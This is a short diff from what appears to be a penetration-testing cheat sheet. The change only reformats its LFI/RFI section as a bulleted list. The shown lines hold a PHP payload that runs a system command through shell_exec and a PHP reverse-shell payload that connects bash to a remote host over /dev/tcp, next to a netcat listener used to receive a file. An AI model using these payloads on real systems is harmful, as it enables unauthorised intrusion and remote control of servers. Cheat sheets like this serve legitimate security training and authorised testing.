@@ -53,8 +53,8 @@ nc -nlvp 4444 > file.txt
 
 LFI / RFI
 ----------------
-<?php echo shell_exec(whoami);?>
-<?phpexec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.10/1234 0>&1'");
+- <?php echo shell_exec(whoami);?>
+- <?phpexec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.10/1234 0>&1'");
 
 MSSQL / SQLi
 ----------------
